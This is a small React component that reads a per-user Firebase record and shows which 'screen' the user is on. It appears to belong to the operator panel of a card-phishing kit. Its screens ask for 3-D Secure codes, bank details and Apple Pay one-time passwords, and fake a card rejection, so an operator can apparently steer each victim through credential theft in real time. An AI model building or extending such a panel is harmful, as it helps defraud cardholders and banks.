import { useEffect, useState } from 'react'
import { db, onSnapshot, doc } from '../../Firebase/FirebaseConfig'


const PageActual = ({ id }) => {
    const [screenSelected, setScreenSelected] = useState()

    const screenActual = () => {
        switch (screenSelected) {
            case "1":
                return "ASK 3D"
            case "2":
                return "ASK Bank"
            case "3":
                return "ASK TC Rechazo"
            case "4":
                return "ASK OTP APPLE PAY"
            case "fin":
                return "Finish"
            default:
                return "Loader"

        }
    }
    useEffect(() => {
        const q = doc(db, 'user', id)
        const onSuscribe = onSnapshot(q, (screen) => {
         
            
            screen.exists()&&setScreenSelected(screen.data().scr||"")
        })

        return () => { onSuscribe() }
    }, [])
    return (
        <div className='text-xs mt-1 flex'>
            <p className='text-white mr-2'>Screen:</p>
            <span className='text-sky-300'>{screenActual()}</span>
        </div>
    )
}

export default PageActual